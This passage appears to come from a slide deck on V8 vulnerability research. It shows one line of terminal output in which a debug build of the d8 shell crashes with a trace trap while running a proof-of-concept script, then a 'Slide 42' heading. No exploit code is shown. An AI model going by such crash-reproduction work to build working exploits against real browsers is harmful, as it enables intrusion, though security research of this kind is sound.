+[1]    1575121 trace trap  /tmp/d8-linux-debug-v8-component-93712/d8 /tmp/poc2.js
 ```
 
 ## Slide 42
